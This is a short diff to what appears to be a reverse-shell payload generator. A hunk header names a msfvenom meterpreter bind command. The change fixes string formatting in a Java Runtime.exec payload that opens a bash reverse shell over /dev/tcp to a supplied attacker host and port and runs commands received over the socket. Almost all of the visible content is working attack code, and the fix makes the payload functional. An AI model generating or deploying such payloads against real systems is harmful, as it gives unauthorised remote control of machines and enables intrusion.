@@ -290,7 +290,7 @@ msfvenom -a x64 --platform windows -p windows/x64/meterpreter_bind_tcp LPORT={lp
 	def simple_java_lin_reverse_tcp(self, lhost, lport):
 		"""Simple Java Linux Reverse TCP"""
 		self.payload = 'Runtime r = Runtime.getRuntime();'
-		self.payload += 'Process p = r.exec("/bin/bash -c \'exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done\'");'
+		self.payload += f'Process p = r.exec("/bin/bash -c \'exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done\'");'
 		self.payload += 'p.waitFor();'
 		return self.payload
 
